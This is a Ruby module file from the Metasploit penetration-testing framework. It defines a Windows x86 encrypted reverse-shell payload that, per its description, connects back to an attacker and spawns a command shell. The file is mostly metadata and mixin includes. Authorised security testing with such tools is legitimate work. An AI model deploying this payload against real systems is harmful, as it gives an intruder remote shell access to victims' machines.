##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/encrypted_shell'
require 'msf/base/sessions/command_shell_options'
require 'msf/core/payload/windows/encrypted_reverse_tcp'
require 'msf/core/payload/windows/encrypted_payload_opts'

module MetasploitModule

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions
  include Msf::Payload::Windows::EncryptedReverseTcp
  include Msf::Payload::Windows::EncryptedPayloadOpts

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Encrypted Reverse Shell',
      'Description'   => 'Connect back to attacker and spawn an encrypted command shell',
      'Author'        => [ 'Shelby Pace' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::EncryptedShell,
      'Dependency'    => Msf::Compilers::Mingw
      ))
  end
end
